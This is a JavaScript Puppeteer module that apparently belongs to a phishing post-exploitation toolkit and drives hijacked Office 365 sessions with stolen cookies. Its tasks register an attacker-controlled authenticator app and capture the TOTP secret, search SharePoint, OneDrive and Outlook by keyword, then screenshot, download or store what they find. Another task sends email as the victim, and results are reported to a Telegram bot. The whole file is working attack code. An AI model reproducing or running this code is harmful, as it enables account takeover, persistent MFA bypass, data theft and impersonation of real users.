'use strict';

const fs = require('fs/promises');
const TelegramBot = require('node-telegram-bot-api');
const db = require('../../db/db');
const clusterLib = require('../../puppeteer/cluster');
const necrohelp = require('../helpers/necrohelp');

function outputPath(taskId, name) {
    const safeTask = String(taskId).replace(/[^a-z0-9._-]/gi, '_');
    const safeName = String(name).replace(/[^a-z0-9._-]/gi, '_');
    return necrohelp.getOutputPath(clusterLib.GetConfig(), `${safeName}_${safeTask}_${Date.now()}`);
}

function required(value, message) {
    if (value === null || value === undefined || value === '') throw new Error(message);
    return value;
}

async function setup(page, taskId, cookies, params) {
    await necrohelp.SetCookieJar(page, cookies);
    await necrohelp.ConfigureUserAgent(page, params?.userAgent, taskId);
    await necrohelp.timedGoto(page, required(params?.fixSession, 'params.fixSession is required'));
    await necrohelp.Sleep(2000);
}

async function click(page, selector) {
    await page.waitForSelector(selector, { timeout: 15000 });
    await page.click(selector);
}

async function hasOfficeSession(page) {
    return Boolean(await page.evaluate(() => document.querySelector('#O365_MainLink_NavMenu >.ms-Icon--WaffleOffice365')));
}

async function openWaffle(page) {
    await click(page, '#O365_MainLink_NavMenu >.ms-Icon--WaffleOffice365');
    await necrohelp.Sleep(2000);
}

async function notify(params, message) {
    if (!params?.telegramToken || !Array.isArray(params.telegramChatId)) return;
    const bot = new TelegramBot(params.telegramToken, { polling: false });
    await Promise.all(params.telegramChatId.map(id => bot.sendMessage(id, message)));
}

exports.AddAuthenticatorApp = async ({ page, data: [taskId, cookies, params] }) => {
    await necrohelp.runTask(db, taskId, async () => {
        const next = 'div.ms-Dialog-actionsRight > span:nth-child(2) > button';
        await notify(params, `Instrumentation #${taskId} started`);
        await setup(page, taskId, cookies, params);
        await click(page, 'i[data-icon-name="Add"]');
        await click(page, 'div.ms-Dropdown-container');
        await click(page, 'div.ms-Callout-main > div > div > button');
        await click(page, next);
        await click(page, 'div.ms-Dialog-content > div > div:nth-child(1) > div > div > button');
        await click(page, next);
        await click(page, 'div.ms-Dialog-content > div > div > div > div > div:nth-child(4) > button');

        const accountName = await page.$eval(
            'div.ms-Dialog-content > div > div > div > div > div:nth-child(6) > span',
            element => element.innerText
        );
        const secretKey = await page.$eval(
            'div.ms-Dialog-content > div > div > div > div > div:nth-child(7) > span',
            element => element.innerText
        );
        await click(page, next);
        const otp = await necrohelp.Totp(secretKey);
        await page.type('div.ms-Dialog-content > div > div > div > div:nth-child(2) > div:nth-child(3) > div > div > input', otp, { delay: 300 });
        await click(page, next);
        await necrohelp.Sleep(5000);
        await db.AddExtrudedData(taskId, 'account_name', Buffer.from(accountName).toString('base64'));
        await db.AddExtrudedData(taskId, 'totp_secret', Buffer.from(secretKey).toString('base64'));
        await notify(params, `[${taskId}] New Authenticator App accountName: ${accountName}`);
    });
};

exports.ScreenshotApps = async ({ page, data: [taskId, cookies, params] }) => {
    await necrohelp.runTask(db, taskId, async () => {
        await setup(page, taskId, cookies, params);
        if (!await hasOfficeSession(page)) throw new Error('Office365 session is not authenticated');
        await necrohelp.ScreenshotCurrentPage(page, taskId);
        await openWaffle(page);
        await click(page, '#O365_AppTile_Sites > .o365sx-neutral-dark-font > span');
        await necrohelp.Sleep(2000);
        await necrohelp.ScreenshotCurrentPage(page, taskId);
        await openWaffle(page);
        await click(page, '#O365_AppTile_SkypeTeams > .o365cs-base > span');
        await necrohelp.Sleep(5000);
        await click(page, '.use-app-lnk');
        await necrohelp.Sleep(5000);
        await necrohelp.ScreenshotCurrentPage(page, taskId);
    });
};

exports.SharepointExtrude = async ({ page, data: [taskId, cookies, params] }) => {
    await necrohelp.runTask(db, taskId, async () => {
        const keywords = necrohelp.requireArray(params?.keywords, 'params.keywords');
        const host = params.sharepointHost || 'penitenziagite.sharepoint.com';
        await setup(page, taskId, cookies, params);
        if (!await hasOfficeSession(page)) throw new Error('Office365 session is not authenticated');
        await openWaffle(page);
        await click(page, '#O365_AppTile_Sites > .o365sx-neutral-dark-font > span');
        const matches = [];
        for (const keyword of keywords) {
            const url = `https://${host}/_layouts/15/sharepoint.aspx?q=${encodeURIComponent(keyword)}&v=search`;
            await necrohelp.timedGoto(page, url);
            await necrohelp.Sleep(4000);
            const links = await page.$$('ol[data-searchpanelcontenttype="body"] > li > div > article > div > div > header > h3');
            for (const link of links) {
                const href = await link.$eval('a', element => element.getAttribute('href'));
                if (href) matches.push(href);
            }
        }

        for (const url of matches) {
            await necrohelp.timedGoto(page, new URL(url, `https://${host}`).toString());
            await necrohelp.Sleep(2000);
            if (url.includes('/Doc.aspx?')) {
                const element = await page.$('#WebApplicationFrame');
                if (!element) throw new Error('SharePoint document iframe not found');
                const frame = await element.contentFrame();
                if (!frame) throw new Error('SharePoint document iframe unavailable');
                const main = await frame.$('#MainApp');
                if (!main) throw new Error('SharePoint document application not found');
                await main.$('#applicationOuterContainer > form');
            }
            await necrohelp.ScreenshotCurrentPage(page, taskId);
        }
    });
};

exports.OneDriveExtrude = async ({ page, data: [taskId, cookies, params] }) => {
    await necrohelp.runTask(db, taskId, async () => {
        await setup(page, taskId, cookies, params);
        if (!await hasOfficeSession(page)) throw new Error('Office365 session is not authenticated');
        await openWaffle(page);
        await click(page, '#O365_AppTile_Documents');
        await necrohelp.Sleep(2000);
        await necrohelp.ScreenshotCurrentPage(page, taskId);
        await necrohelp.setDownloadBehavior(page, necrohelp.getOutputDirectory(clusterLib.GetConfig()));
        await click(page, 'div.ms-FocusZone > div > div.ms-DetailsHeader-checkTooltip');
        await click(page, 'button[name="Download"]');
        await necrohelp.Sleep(5000);

        const libraries = await page.$$('nav.ms-Nav > div:nth-child(2) > div.ms-Nav-groupContent > ul.ms-Nav-navItems > li');
        for (let index = 0; index < Math.max(0, libraries.length - 1); index += 1) {
            await click(page, `nav.ms-Nav > div:nth-child(2) > div.ms-Nav-groupContent > ul.ms-Nav-navItems > li:nth-child(${index + 1}) > div > a`);
            await necrohelp.Sleep(3000);
            await necrohelp.ScreenshotCurrentPage(page, taskId);
            await click(page, 'div.ms-DetailsList-headerWrapper > div > div');
            const download = await page.waitForSelector('button[name="Download"]', { timeout: 2000 }).catch(() => null);
            if (download) {
                await download.click();
                await necrohelp.Sleep(3000);
            }
        }
    });
};

exports.OutlookWriteEmail = async ({ page, data: [taskId, cookies, params] }) => {
    await necrohelp.runTask(db, taskId, async () => {
        const email = required(params?.writeEmail, 'params.writeEmail is required');
        for (const field of ['to', 'subject', 'data']) required(email[field], `writeEmail.${field} is required`);
        await setup(page, taskId, cookies, params);
        await necrohelp.SetPageScaleFactor(page, clusterLib.GetConfig().cluster.page.scaleFactor);
        if (!await hasOfficeSession(page)) throw new Error('Office365 session is not authenticated');
        await click(page, '#app > div > div:nth-child(3) > div > div > div > div > div:nth-child(2) > button');
        await necrohelp.Sleep(3000);
        const to = 'div[aria-label="Reading Pane"] > div > div > div> div > div> div> div > div > div > div> div > div > div > div > div > div > input';
        const subject = 'div[aria-label="Reading Pane"] > div > div > div> div > div > div:nth-child(2) > div >div > div > div > input';
        const content = 'div[aria-label="Reading Pane"] > div > div > div> div > div > div:nth-child(2) > div';
        const send = 'div[aria-label="Reading Pane"] > div > div > div> div > div > div:nth-child(3) > div:nth-child(2) > div > div > span > button';
        await page.type(to, email.to);
        await page.type(subject, email.subject, { delay: 50 });
        await page.type(content, email.data, { delay: 50 });
        await necrohelp.Sleep(5000);
        await click(page, send);
        await necrohelp.Sleep(5000);
    });
};

exports.OutlookExtrude = async ({ page, data: [taskId, cookies, params] }) => {
    await necrohelp.runTask(db, taskId, async () => {
        const keywords = necrohelp.requireArray(params?.keywords, 'params.keywords');
        await setup(page, taskId, cookies, params);
        await necrohelp.SetPageScaleFactor(page, clusterLib.GetConfig().cluster.page.scaleFactor);
        if (!await hasOfficeSession(page)) throw new Error('Office365 session is not authenticated');
        for (const keyword of keywords) {
            await page.type('#searchBoxId-Mail input[aria-label="Search"]', keyword);
            await page.keyboard.press('Enter');
            await necrohelp.Sleep(3000);
            let selector = 'div.threeColumnCirclePersonaDivWidth + div';
            let matches = 0;
            while (true) {
                const emailElement = await page.$(selector);
                if (!emailElement) break;
                await emailElement.click();
                await necrohelp.Sleep(1000);
                const subject = await page.$eval("div[aria-label='Content pane'] > div span", element => element.textContent || '');
                const parts = await page.$$('div.wide-content-host div.allowTextSelection');
                for (const part of parts) {
                    const html = await part.$eval('div', element => element.innerHTML);
                    const payload = Buffer.from(JSON.stringify({ subject, html }, null, 4)).toString('base64');
                    await fs.writeFile(outputPath(taskId, `email_${keyword}_${matches}.html`), html);
                    await db.AddExtrudedData(taskId, `email_${keyword}_${matches}`, payload);
                }
                selector += ' + div';
                matches += 1;
            }
            await page.evaluate(() => {
                const input = document.querySelector('#searchBoxId-Mail input[aria-label="Search"]');
                if (input) input.value = '';
            });
            await necrohelp.Sleep(2000);
        }
    });
};
